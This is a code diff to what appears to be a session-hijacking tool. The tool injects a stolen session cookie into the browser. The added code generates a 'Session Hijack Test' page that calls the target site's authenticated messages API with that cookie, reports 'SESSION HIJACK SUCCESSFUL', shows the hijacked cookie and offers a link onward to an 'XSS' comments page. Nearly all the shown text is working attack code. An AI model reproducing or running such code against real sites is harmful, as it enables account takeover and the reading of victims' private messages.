@@ -354,10 +354,118 @@
                 document.cookie = sessionCookie + "; path=/";
               }
               
-              alert('✅ Cookie injected!\\n\\nDomain: ' + (domain || 'current') + '\\n\\n⚠️ NEXT STEPS:\\n1. This will open the target site\\n2. Open DevTools (F12) → Console\\n3. Run: location.reload() to refresh with hijacked session\\n4. Or manually click around to trigger session check');
+              // Create a test page that validates the session and shows success
+              const testHTML = \`
+<!DOCTYPE html>
+<html>
+<head>
+  <title>🎯 Session Hijack Test</title>
+  <style>
+    body { 
+      background: #000; color: #00ff00; 
+      font-family: 'Courier New', monospace; 
+      padding: 40px; text-align: center; 
+    }
+    .container {
+      max-width: 700px; margin: 0 auto;
+      background: #1a1a1a; padding: 30px;
+      border: 2px solid #00ff00; border-radius: 10px;
+    }
+    h1 { color: #ff0000; }
+    .success { color: #00ff00; font-size: 1.2rem; }
+    .error { color: #ff0000; font-size: 1.2rem; }
+    pre { 
+      background: #000; padding: 15px; 
+      border-radius: 5px; text-align: left; 
+      overflow-x: auto; color: #ffaa00; 
+    }
+    button {
+      background: #ff0000; color: #fff;
+      border: none; padding: 15px 30px;
+      font-size: 1.1rem; border-radius: 5px;
+      cursor: pointer; margin: 10px;
+      font-family: 'Courier New', monospace;
+    }
+    button:hover { background: #cc0000; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>🎯 SESSION HIJACK STATUS</h1>
+    <div id="status">⏳ Testing hijacked session...</div>
+    <div id="result"></div>
+    <div id="actions" style="display:none; margin-top: 20px;">
+      <button onclick="window.location.href='\${targetURL}'">
+        🚀 GO TO TARGET SITE
+      </button>
+      <button onclick="openCommentsPage()">
+        💬 GO TO COMMENTS (XSS)
+      </button>
+    </div>
+  </div>
+  
+  <script>
+    const targetURL = '\${targetURL}';
+    
+    // Test if session is valid by calling an API
+    async function testSession() {
+      try {
+        // Try to fetch messages - requires authentication
+        const response = await fetch(targetURL + '/api/messages/1', {
+          credentials: 'include'  // Include cookies
+        });
+        
+        if (response.ok) {
+          const data = await response.json();
+          document.getElementById('status').innerHTML = 
+            '<div class="success">✅ SESSION HIJACK SUCCESSFUL!</div>';
+          document.getElementById('result').innerHTML = \`
+            <pre>Cookie is valid!
+Session active!
+Target: \${targetURL}
+
+Hijacked session cookie:
+\${document.cookie}</pre>
+          \`;
+          document.getElementById('actions').style.display = 'block';
+        } else {
+          throw new Error('Session invalid (HTTP ' + response.status + ')');
+        }
+      } catch (error) {
+        document.getElementById('status').innerHTML = 
+          '<div class="error">❌ SESSION HIJACK FAILED</div>';
+        document.getElementById('result').innerHTML = \`
+          <pre>Error: \${error.message}
+
+This could mean:
+1. Cookie domain mismatch
+2. Session expired
+3. CORS blocking the request
+4. httpOnly cookie (can't access via JS)
+
+Current cookie:
+\${document.cookie}
+
+Try manual method instead!</pre>
+        \`;
+      }
+    }
+    
+    function openCommentsPage() {
+      window.location.href = targetURL + '/comments.html';
+    }
+    
+    // Run test immediately
+    testSession();
+  <\/script>
+</body>
+</html>
+              \`;
               
-              // Open target in same window
-              window.location.href = targetURL;
+              // Write the test page to current window
+              document.open();
+              document.write(testHTML);
+              document.close();
             }
             
             function manualInstructions() {
